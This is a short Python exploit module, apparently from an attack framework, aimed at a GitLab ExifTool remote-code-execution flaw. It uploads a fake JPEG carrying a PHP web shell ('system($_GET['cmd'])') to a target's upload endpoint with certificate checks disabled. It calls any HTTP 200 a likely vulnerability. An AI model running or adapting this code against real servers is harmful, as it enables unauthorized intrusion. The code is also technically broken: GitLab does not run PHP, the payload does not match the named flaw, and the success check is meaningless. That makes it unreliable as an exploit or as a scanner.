import requests
from core.printmodels import *
import base64

class Gitlab_ExifTool_RCE:
    def __init__(self):
        self.name = "GitLab ExifTool RCE"
        self.description = "GitLab CE/EE Exiftool RCE"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "multipart/form-data"
            }
            
            # Crafted malicious image file content
            payload = b"MM\x00*\x00\x00\x00\x08\x00\x00\x00\x01'\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00"
            payload += b"<?php system($_GET['cmd']); ?>"
            
            files = {
                'file': ('exploit.jpg', payload, 'image/jpeg')
            }
            
            target = f"{site}/uploads/user"
            response = requests.post(target, files=files, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                return PrintSuccess(f"[GitLab-ExifTool] Potentially vulnerable to RCE!")
            return PrintFailed("[GitLab-ExifTool] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[GitLab-ExifTool] Error: {str(e)}")
